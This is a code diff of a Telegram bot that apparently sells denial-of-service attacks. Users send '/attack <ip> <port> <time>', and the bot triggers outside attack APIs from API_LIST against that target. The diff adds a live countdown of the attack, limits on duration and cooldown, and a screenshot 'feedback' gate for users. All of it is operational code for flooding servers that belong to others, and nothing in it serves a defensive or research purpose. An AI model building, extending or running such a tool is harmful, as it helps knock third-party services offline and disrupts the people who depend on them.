@@ -173,26 +173,47 @@ def check_port_protection(user_id, target, port):
 def start_attack(target, port, duration, message, attack_id, api_index):
     try:
         user_id = message.from_user.id
-        bot.reply_to(message, f"🚀 **ATTACK INITIATED** 🚀\n\n"
-                              f"📡 **Target:** `{target}`\n"
-                              f"🔌 **Port:** `{port}`\n"
-                              f"⏳ **Duration:** `{duration}s`\n"
-                              f"📟 **Slot:** `{api_index + 1}/{len(API_LIST)}`\n"
-                              f"━━━━━━━━━━━━━━━━━━\n"
-                              f"⚡ *Packet injection in progress...*")
+        
+        # 1. Send the initial "Attack Started" message
+        sent_msg = bot.reply_to(message, f"🚀 **ATTACK INITIATED** 🚀\n\n"
+                                         f"📡 **Target:** `{target}`\n"
+                                         f"🔌 **Port:** `{port}`\n"
+                                         f"⏳ **Time Left:** `{duration}s`\n"
+                                         f"📟 **Slot:** `{api_index + 1}/{len(API_LIST)}`\n"
+                                         f"━━━━━━━━━━━━━━━━━━\n"
+                                         f"⚡ *Packet injection in progress...*")
 
+        # 2. Trigger the API
         api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)
         try:
-            response = requests.get(api_url, timeout=10)
+            requests.get(api_url, timeout=10)
         except Exception as e:
-            print(f"API error: {e}")
+            print(f"API Trigger Error: {e}")
 
-        if user_id not in user_attack_history:
-            user_attack_history[user_id] = {}
-        user_attack_history[user_id][f"{target}:{port}"] = datetime.now()
+        # 3. LIVE COUNTDOWN LOOP
+        remaining = duration
+        while remaining > 0:
+            time.sleep(5)  # Update every 5 seconds to avoid Telegram rate limits
+            remaining -= 5
+            if remaining < 0: remaining = 0
+            
+            try:
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=sent_msg.message_id,
+                    text=f"🚀 **ATTACK IN PROGRESS** 🚀\n\n"
+                         f"📡 **Target:** `{target}`\n"
+                         f"🔌 **Port:** `{port}`\n"
+                         f"⏳ **Time Left:** `{remaining}s`\n"
+                         f"📟 **Slot:** `{api_index + 1}/{len(API_LIST)}`\n"
+                         f"━━━━━━━━━━━━━━━━━━\n"
+                         f"⚡ *Injecting malicious payload...*"
+                )
+            except Exception as e:
+                # If editing fails (e.g., message deleted), break the loop
+                break
 
-        time.sleep(duration)
-
+        # 4. Cleanup and Feedback Request
         with _attack_lock:
             if attack_id in active_attacks: del active_attacks[attack_id]
             if attack_id in api_in_use: del api_in_use[attack_id]
@@ -203,17 +224,18 @@ def start_attack(target, port, duration, message, attack_id, api_index):
             'chat_id': message.chat.id
         }
 
-        bot.reply_to(message, f"✅ **MISSION ACCOMPLISHED** ✅\n\n"
-                              f"🎯 **Target:** `{target}:{port}`\n"
-                              f"🏁 **Status:** Packets Delivered\n"
-                              f"━━━━━━━━━━━━━━━━━━\n"
-                              f"📸 **FEEDBACK REQUIRED:** Send a screenshot to clear logs and unlock next sequence.")
+        bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=sent_msg.message_id,
+            text=f"✅ **MISSION ACCOMPLISHED** ✅\n\n"
+                 f"🎯 **Target:** `{target}:{port}`\n"
+                 f"🏁 **Status:** Packets Delivered\n"
+                 f"━━━━━━━━━━━━━━━━━━\n"
+                 f"📸 **FEEDBACK REQUIRED:** Send screenshot to unlock next sequence."
+        )
 
     except Exception as e:
-        with _attack_lock:
-            if attack_id in active_attacks: del active_attacks[attack_id]
-            if attack_id in api_in_use: del api_in_use[attack_id]
-        print(f"Attack error: {e}")
+        print(f"Attack thread error: {e}")
 
 # --- COMMAND HANDLERS ---
 @bot.message_handler(commands=['start'])
@@ -232,7 +254,7 @@ def start_command(message):
     bot.reply_to(message, "⚡ **SYSTEM ONLINE: CYBER-CORE V3** ⚡\n\n"
                           "🌐 **Uplink Established**\n"
                           "━━━━━━━━━━━━━━━━━━\n"
-                          "⚔️ `/chodo` <ip> <port> <time>\n"
+                          "⚔️ `/attack` <ip> <port> <time>\n"
                           "📊 `/status` - Network Load\n"
                           "🛡️ `/help` - Manual\n"
                           "━━━━━━━━━━━━━━━━━━")
@@ -431,48 +453,70 @@ def clear_feedbacks(message):
 def handle_attack(message):
     if not check_access(message): return
     user_id = message.from_user.id
+    
     if not is_owner(user_id) and has_pending_feedback(user_id):
         bot.reply_to(message, "⚠️ **LOGS NOT CLEARED**\n\n`Pending Feedback Detected.` Upload the previous session screenshot to proceed.")
         return
+        
     if not is_owner(user_id):
         cooldown = get_user_cooldown(user_id)
         if cooldown > 0:
             bot.reply_to(message, f"⏳ **SYSTEM OVERHEAT**\n\nCooldown active. Please wait `{cooldown}s` for hardware reset.")
             return
+            
     if user_has_active_attack(user_id):
         bot.reply_to(message, "❌ **DUPLICATE THREAD DETECTED**\n\nWait for current session to expire.")
         return
+        
     active_count = get_active_attack_count()
     if active_count >= len(API_LIST):
         bot.reply_to(message, "❌ **LOAD LIMIT REACHED**\n\nAll uplink slots are busy. Monitor `/status` for a free slot.")
         return
+        
     command_parts = message.text.split()
     if len(command_parts) != 4:
         bot.reply_to(message, "⚠️ **SYNTAX ERROR**\n\n`Use: /attack <ip> <port> <time>`")
         return
+        
     target, port, duration = command_parts[1], command_parts[2], command_parts[3]
+    
     if not validate_target(target):
         bot.reply_to(message, "❌ **INVALID IP ADDRESS**")
         return
+        
     try:
         port, duration = int(port), int(duration)
         if port < 1 or port > 65535: return
+        
         blocked, remaining = is_port_blocked(target, port)
         if blocked:
             bot.reply_to(message, f"🚫 **TARGET PROTECTED**\n\n`{target}:{port}` is currently quarantined for `{remaining // 60}m`.")
             return
+
+        # --- TIME LIMIT LOGIC FOR NON-OWNERS ---
         if not is_owner(user_id):
-            protected, p_rem = check_port_protection(user_id, target, port)
-            if protected:
-                bot.reply_to(message, f"🛡️ **PORT SHIELD ACTIVE**\n\nCooldown for this target: `{p_rem // 60}m` remaining.")
+            # 1. Minimum Check
+            if duration < 60:
+                bot.reply_to(message, "❌ **UNDERLOAD ERROR**\n\nMinimum burst time is `60s`.")
                 return
+            
+            # 2. Maximum Check
             max_t = data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
             if duration > max_t:
                 bot.reply_to(message, f"❌ **BURST LIMIT EXCEEDED:** Max is `{max_t}s`")
                 return
+
+            # 3. Port Protection Check
+            protected, p_rem = check_port_protection(user_id, target, port)
+            if protected:
+                bot.reply_to(message, f"🛡️ **PORT SHIELD ACTIVE**\n\nCooldown for this target: `{p_rem // 60}m` remaining.")
+                return
+        # ---------------------------------------
+
         attack_id = f"{user_id}_{datetime.now().timestamp()}"
         api_index = get_free_api_index()
         if api_index is None: return
+        
         with _attack_lock:
             cd_time = data.get('cooldown', DEFAULT_COOLDOWN)
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=(duration + cd_time))
@@ -483,6 +527,7 @@ def handle_attack(message):
                 'end_time': datetime.now() + timedelta(seconds=duration)
             }
         threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index)).start()
+        
     except ValueError:
         bot.reply_to(message, "❌ **DATATYPE ERROR:** Use numeric values for port and time.")
 
